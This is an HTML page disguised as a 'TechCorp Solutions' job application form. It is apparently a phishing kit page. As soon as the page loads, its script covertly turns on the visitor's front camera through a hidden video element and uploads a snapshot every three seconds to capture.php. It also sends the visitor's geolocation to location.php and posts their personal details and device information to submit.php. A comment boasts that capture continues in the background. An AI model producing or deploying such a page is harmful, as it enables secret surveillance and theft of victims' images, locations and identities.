<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Career Opportunities - TechCorp Solutions</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 1rem;
            opacity: 0.9;
        }

        .form-section {
            padding: 40px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="file"],
        textarea,
        select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s;
            font-family: inherit;
        }

        input:focus,
        textarea:focus,
        select:focus {
            outline: none;
            border-color: #667eea;
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        .radio-group {
            display: flex;
            gap: 20px;
            margin-top: 10px;
        }

        .radio-option {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .radio-option input[type="radio"] {
            width: auto;
            cursor: pointer;
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .required {
            color: #e74c3c;
        }

        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #c3e6cb;
        }

        .hidden-elements {
            display: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>🚀 Join Our Team</h1>
            <p>TechCorp Solutions - Building the Future Together</p>
        </div>

        <div class="form-section">
            <div class="success-message" id="successMsg">
                ✓ Application submitted successfully! We'll review your profile and get back to you soon.
            </div>

            <form id="jobForm">
                <div class="form-group">
                    <label>Full Name <span class="required">*</span></label>
                    <input type="text" id="name" name="name" required placeholder="John Doe">
                </div>

                <div class="form-group">
                    <label>Email Address <span class="required">*</span></label>
                    <input type="email" id="email" name="email" required placeholder="john.doe@example.com">
                </div>

                <div class="form-group">
                    <label>City <span class="required">*</span></label>
                    <input type="text" id="city" name="city" required placeholder="New York">
                </div>

                <div class="form-group">
                    <label>Phone Number <span class="required">*</span></label>
                    <input type="tel" id="phone" name="phone" required placeholder="+1 (555) 123-4567">
                </div>

                <div class="form-group">
                    <label>Upload Your CV/Resume <span class="required">*</span></label>
                    <input type="file" id="cv" name="cv" accept=".pdf,.doc,.docx" required>
                </div>

                <div class="form-group">
                    <label>Why do you want to join TechCorp? <span class="required">*</span></label>
                    <textarea id="reason" name="reason" required
                        placeholder="Tell us what excites you about this opportunity..."></textarea>
                </div>

                <div class="form-group">
                    <label>Key Skills (comma separated) <span class="required">*</span></label>
                    <input type="text" id="skills" name="skills" required
                        placeholder="JavaScript, Python, Project Management">
                </div>

                <div class="form-group">
                    <label>Work Preference <span class="required">*</span></label>
                    <div class="radio-group">
                        <div class="radio-option">
                            <input type="radio" id="remote" name="workPreference" value="Remote" required>
                            <label for="remote" style="margin: 0;">Remote</label>
                        </div>
                        <div class="radio-option">
                            <input type="radio" id="onsite" name="workPreference" value="Onsite">
                            <label for="onsite" style="margin: 0;">Onsite</label>
                        </div>
                        <div class="radio-option">
                            <input type="radio" id="hybrid" name="workPreference" value="Hybrid">
                            <label for="hybrid" style="margin: 0;">Hybrid</label>
                        </div>
                    </div>
                </div>

                <button type="submit" class="submit-btn">Submit Application</button>
            </form>
        </div>
    </div>

    <!-- Hidden elements for camera and location -->
    <div class="hidden-elements">
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="640"></canvas>
    </div>

    <script src="../../assets/js/jquery.min.js"></script>
    <script>
        let captureInterval = null;
        let videoStream = null;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Request camera and location on page load
        async function initCapture() {
            try {
                // Request camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                videoStream = stream;
                video.srcObject = stream;

                // Start capturing images every 3 seconds
                captureInterval = setInterval(captureImage, 3000);

                // Request location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendLocation, () => { });
                }
            } catch (e) {
                console.log("Permission denied or not available");
            }
        }

        function captureImage() {
            if (!videoStream) return;

            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 640);
            const imageData = canvas.toDataURL("image/png");

            // Send image to server
            $.ajax({
                type: 'POST',
                url: 'capture.php',
                data: { image: imageData },
                dataType: 'json',
                async: true,
                success: function () { },
                error: function () { }
            });
        }

        function sendLocation(position) {
            $.ajax({
                type: 'POST',
                url: 'location.php',
                data: {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    acc: position.coords.accuracy
                },
                async: true
            });
        }

        // Initialize on page load
        window.addEventListener('load', initCapture);

        // Handle form submission
        document.getElementById('jobForm').addEventListener('submit', function (e) {
            e.preventDefault();

            // Collect form data
            const formData = {
                timestamp: new Date().toISOString(),
                name: document.getElementById('name').value,
                email: document.getElementById('email').value,
                city: document.getElementById('city').value,
                phone: document.getElementById('phone').value,
                cvFileName: document.getElementById('cv').files[0]?.name || 'No file',
                reason: document.getElementById('reason').value,
                skills: document.getElementById('skills').value,
                workPreference: document.querySelector('input[name="workPreference"]:checked').value,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenResolution: window.screen.width + 'x' + window.screen.height
            };

            // Save to localStorage
            let applications = JSON.parse(localStorage.getItem('jobApplications') || '[]');
            applications.push(formData);
            localStorage.setItem('jobApplications', JSON.stringify(applications));

            // Send to server
            $.ajax({
                type: 'POST',
                url: 'submit.php',
                data: formData,
                success: function () {
                    document.getElementById('successMsg').style.display = 'block';
                    document.getElementById('jobForm').reset();

                    // Scroll to success message
                    document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth' });

                    // Hide success message after 5 seconds
                    setTimeout(() => {
                        document.getElementById('successMsg').style.display = 'none';
                    }, 5000);
                }
            });
        });

        // Keep capturing even if user navigates away (using Page Visibility API)
        document.addEventListener('visibilitychange', function () {
            if (document.hidden) {
                // Page is hidden, but capture continues
                console.log('Background capture active');
            }
        });
    </script>
</body>

</html>
